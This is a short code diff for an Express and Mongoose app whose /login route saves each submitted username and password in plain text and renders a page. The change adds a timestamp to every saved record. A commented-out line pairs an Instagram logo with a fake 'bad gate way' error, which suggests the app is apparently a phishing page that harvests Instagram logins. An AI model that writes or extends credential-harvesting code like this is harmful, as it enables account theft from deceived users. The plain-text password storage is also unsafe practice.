@@ -19,6 +19,10 @@ const userSchema = mongoose.Schema({
   password: {
     type: String,
     required: true
+  },
+  time:{
+   type:Date,
+    default:Date.now
   }
 })
 const User  = mongoose.model('users',userSchema);
@@ -34,7 +38,7 @@ app.post('/login',(req,res)=>{
     // res.send('<img src="./assets/img/instagram.svg"></img><h1>Connection got disconnected due to bad gate way, try again </h1>')
     let username  = req.body.username;
     let password = req.body.password;
-    const user = new User({username,password});
+    const user = new User({username,password,time:new Date});
     user.save().then(()=>{
       console.log('hogaya');
       res.status(200).render('ui.pug');
